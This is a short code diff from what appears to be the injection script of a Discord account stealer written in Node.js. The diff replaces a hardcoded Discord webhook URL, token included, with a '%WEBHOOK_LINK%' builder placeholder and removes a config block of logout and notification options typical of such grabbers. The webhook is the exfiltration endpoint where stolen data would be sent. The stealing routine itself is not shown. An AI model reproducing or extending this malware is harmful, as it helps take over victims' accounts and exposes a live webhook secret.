@@ -14,7 +14,7 @@ const querystring = require('querystring');
 
 const os = require('os')
 
-var webhook = "https://discord.com/api/webhooks/954386741014433854/Y8XfDdFhrJfwgCJTp3533_Qi_3wRlwVCf6cKMMx-B9noBxxp5jqdVyQYzTW_K8DvQucX";
+var webhook = "%WEBHOOK_LINK%";
 
 const computerName = os.hostname();
 
@@ -37,22 +37,6 @@ String.prototype.insert = function (index, string) {
 	return string + this;
 
 };
-
-
-
-const config = {
-
-    "logout": "%LOGOUT%",
-
-    "logout-notify": "%LOGOUTNOTI%",
-
-    "init-notify":"%INITNOTI%",
-
-    "embed-color": 00000,
-
-    "disable-qr-code":"%DISABLEQRCODE%"
-
-}
 
 
 
